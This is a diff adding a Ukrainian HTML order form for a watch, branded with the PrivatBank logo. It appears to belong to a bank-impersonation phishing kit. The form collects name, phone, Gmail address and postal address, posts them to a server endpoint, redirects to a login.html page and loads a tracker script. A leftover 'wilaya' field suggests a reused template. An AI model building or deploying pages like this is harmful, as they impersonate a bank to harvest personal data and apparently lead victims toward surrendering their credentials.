@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="uk" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Деталі замовлення</title>
+<style>
+  :root{--bg:#ffffff;--ink:#141414;--muted:#8a8f98;--line:#e3e3e3;--accent:#e02424}
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{background:var(--bg);color:var(--ink);
+    font-family:"Segoe UI",Tahoma,Arial,sans-serif}
+  body{max-width:520px;margin:0 auto;min-height:100vh;box-shadow:0 0 40px rgba(0,0,0,.04)}
+
+  header{height:64px;background:#fff;border-bottom:3px solid #00A651;
+    display:flex;align-items:center;justify-content:space-between;gap:6px;padding:0 16px;position:sticky;top:0;z-index:40}
+  .icon-btn{width:40px;height:40px;border:none;background:transparent;cursor:pointer;
+    border-radius:8px;font-size:22px;color:var(--ink);display:flex;
+    align-items:center;justify-content:center;text-decoration:none}
+  .icon-btn:hover{background:#f3f4f6}
+  header .title{font-size:17px;font-weight:700;margin-inline-start:4px}
+
+  .summary{display:none;align-items:center;gap:14px;margin:16px 16px 0;
+    padding:12px 14px;border:1px solid var(--line);border-radius:16px;background:#fafafa}
+  .summary.show{display:flex}
+  .summary .pic{width:64px;height:64px;border-radius:50%;background:#fff;
+    border:1px solid var(--line);display:flex;align-items:center;justify-content:center;padding:6px}
+  .summary .pic img{max-width:100%;max-height:100%;object-fit:contain}
+  .summary .t{font-size:13px;color:var(--muted)}
+  .summary .n{font-size:16px;font-weight:700;margin-top:2px}
+
+  form{padding:22px 16px 40px}
+  form h1{font-size:22px;font-weight:800;margin-bottom:6px}
+  form .lead{color:var(--muted);font-size:14px;margin-bottom:22px}
+  .field{margin-bottom:16px}
+  .field label{display:block;font-size:14px;font-weight:600;margin-bottom:7px}
+  .field input,.field select,.field textarea{
+    width:100%;padding:13px 14px;border:1.5px solid var(--line);border-radius:12px;
+    font-size:15px;font-family:inherit;background:#fff;color:var(--ink);outline:none;
+    transition:.15s}
+  .field input:focus,.field select:focus,.field textarea:focus{border-color:var(--ink)}
+  .field textarea{resize:vertical;min-height:70px}
+  .field select{appearance:none;background-image:
+    linear-gradient(45deg,transparent 50%,#888 50%),
+    linear-gradient(135deg,#888 50%,transparent 50%);
+    background-position:calc(100% - 16px) 55%,calc(100% - 21px) 55%;
+    background-size:5px 5px,5px 5px;background-repeat:no-repeat}
+  .submit{width:100%;border:none;background:#00A651;color:#fff;padding:16px;
+    border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px;
+    box-shadow:0 4px 15px rgba(0,166,81,.3)}
+  .submit:hover{background:#008C45}
+
+  .done{display:none;text-align:center;padding:60px 24px}
+  .done.show{display:block}
+  .done .check{width:76px;height:76px;border-radius:50%;background:#e9f9ee;
+    color:#1a9c45;font-size:40px;display:flex;align-items:center;justify-content:center;
+    margin:0 auto 20px}
+  .done h2{font-size:22px;font-weight:800;margin-bottom:10px}
+  .done p{color:var(--muted);font-size:15px;line-height:1.6}
+  .done a{display:inline-block;margin-top:24px;color:var(--ink);text-decoration:none;
+    border:1.5px solid var(--ink);padding:12px 26px;border-radius:12px;font-weight:700}
+</style>
+</head>
+<body>
+  <header>
+    <img src="images/privatbank-logo.jpg" alt="PrivatBank" style="height:46px">
+    <span class="title">Деталі замовлення</span>
+    <a class="icon-btn" href="colors.html" aria-label="Назад">&#8249;</a>
+  </header>
+
+  <div class="summary" id="summary">
+    <div class="pic"><img id="sumImg" src="" alt=""></div>
+    <div>
+      <div class="t">Обраний годинник</div>
+      <div class="n" id="sumName">&mdash;</div>
+    </div>
+  </div>
+
+  <form id="orderForm">
+    <h1>Заповніть вашу інформацію</h1>
+    <p class="lead">Будь ласка, введіть вашу інформацію для оформлення замовлення</p>
+
+    <div class="field">
+      <label for="name">Повне ім'я</label>
+      <input id="name" name="name" type="text" placeholder="напр.: Іван Петренко" required>
+    </div>
+
+    <div class="field">
+      <label for="phone">Номер телефону</label>
+      <div style="display:flex;gap:0;align-items:stretch">
+        <div style="display:flex;align-items:center;gap:6px;padding:0 12px;background:#f5f5f5;border:1.5px solid var(--line);border-right:none;border-radius:12px 0 0 12px;font-size:15px;font-weight:600;color:#333;white-space:nowrap">
+          <span style="font-size:20px">🇺🇦</span> +380
+        </div>
+        <input id="phone" name="phone" type="tel" placeholder="XX XXX XX XX"
+               inputmode="tel" pattern="[0-9 ]{9,}" required
+               style="border-radius:0 12px 12px 0;border-left:none">
+      </div>
+    </div>
+
+    <div class="field">
+      <label for="email">Електронна пошта (Gmail)</label>
+      <input id="email" name="email" type="email" placeholder="example@gmail.com" required>
+    </div>
+
+    <div class="field">
+      <label for="country">Країна</label>
+      <select id="country" name="country" required>
+        <option value="UA" selected>🇺🇦 Україна</option>
+      </select>
+    </div>
+
+    <div class="field">
+      <label for="wilaya">Область</label>
+      <select id="wilaya" name="wilaya" required>
+        <option value="" disabled selected>Оберіть область</option>
+      </select>
+    </div>
+
+    <div class="field">
+      <label for="city">Місто / Населений пункт</label>
+      <input id="city" name="city" type="text" placeholder="напр.: Київ" required>
+    </div>
+
+    <div class="field">
+      <label for="address">Адреса доставки</label>
+      <textarea id="address" name="address" placeholder="напр.: вул. Хрещатик, 22, кв. 15" required></textarea>
+    </div>
+
+    <div class="field">
+      <label for="postcode">Поштовий індекс</label>
+      <input id="postcode" name="postcode" type="text" placeholder="напр.: 01001" inputmode="numeric" pattern="[0-9]{5}" required>
+    </div>
+
+    <button class="submit" type="submit">Підтвердити замовлення</button>
+  </form>
+
+  <div class="done" id="done">
+    <div class="check">&#10003;</div>
+    <h2>Замовлення отримано</h2>
+    <p>Дякуємо, ми зв'яжемося з вами найближчим часом за вашим номером для підтвердження замовлення та доставки.</p>
+    <a href="index.html">На головну</a>
+  </div>
+
+
+<script>
+  var oblasts = [
+    "Вінницька область","Волинська область","Дніпропетровська область",
+    "Донецька область","Житомирська область","Закарпатська область",
+    "Запорізька область","Івано-Франківська область","Київська область",
+    "Кіровоградська область","Луганська область","Львівська область",
+    "Миколаївська область","Одеська область","Полтавська область",
+    "Рівненська область","Сумська область","Тернопільська область",
+    "Харківська область","Херсонська область","Хмельницька область",
+    "Черкаська область","Чернівецька область","Чернігівська область",
+    "м. Київ"
+  ];
+
+  (function(){
+    var sel = document.getElementById("wilaya");
+    sel.innerHTML = '<option value="" disabled selected>Оберіть область</option>';
+    oblasts.forEach(function(o){
+      var opt = document.createElement("option");
+      opt.value = o; opt.textContent = o; sel.appendChild(opt);
+    });
+  })();
+
+  const watches = [
+    {img:"images/6.png",name:"Bold Red"},{img:"images/3.png",name:"Elegant Silver"},
+    {img:"images/2.png",name:"Luxurious Gold"},{img:"images/1.png",name:"Classic Black"},
+    {img:"images/4.png",name:"Vibrant Orange"},{img:"images/5.png",name:"Royal Blue"},
+    {img:"images/7.png",name:"Military Green"},{img:"images/8.png",name:"Soft Pink"},
+    {img:"images/9.png",name:"Dark Purple"},{img:"images/10.png",name:"Pure White"},
+    {img:"images/11.png",name:"Earth Brown"},{img:"images/12.png",name:"Powder Pink"},
+    {img:"images/13.png",name:"Turquoise"},{img:"images/14.png",name:"Navy Blue"},
+    {img:"images/15.png",name:"Mint"},{img:"images/16.png",name:"Bright Yellow"},
+    {img:"images/17.png",name:"Coral"},{img:"images/18.png",name:"Lavender"}
+  ];
+  const pick = parseInt(new URLSearchParams(location.search).get("w"));
+  if(!isNaN(pick) && watches[pick]){
+    document.getElementById("sumImg").src = watches[pick].img;
+    document.getElementById("sumName").textContent = watches[pick].name;
+    document.getElementById("summary").classList.add("show");
+  }
+
+  document.getElementById("orderForm").addEventListener("submit", async e=>{
+    e.preventDefault();
+    const btn = document.querySelector(".submit");
+    btn.disabled = true;
+    btn.textContent = "Надсилання...";
+    try {
+      const watchColor = (!isNaN(pick) && watches[pick]) ? watches[pick].name : "";
+      const res = await fetch("/api/orders", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          name: document.getElementById("name").value,
+          phone: "+380" + document.getElementById("phone").value.replace(/\s/g,""),
+          email: document.getElementById("email").value,
+          country: document.getElementById("country").value,
+          wilaya: document.getElementById("wilaya").value,
+          city: document.getElementById("city").value,
+          address: document.getElementById("address").value,
+          postcode: document.getElementById("postcode").value,
+          watch_color: watchColor,
+          watch_index: (!isNaN(pick) && watches[pick]) ? pick : null
+        })
+      });
+      const data = await res.json();
+      if (!data.success) throw new Error(data.message);
+      location.href = "login.html" + (data.order_id ? "?order=" + data.order_id : "");
+    } catch(err) {
+      alert("Помилка: " + err.message);
+      btn.disabled = false;
+      btn.textContent = "Підтвердити замовлення";
+    }
+  });
+</script>
+<script src="footer.js"></script>
+<script src="tracker.js"></script>
+</body>
+</html>
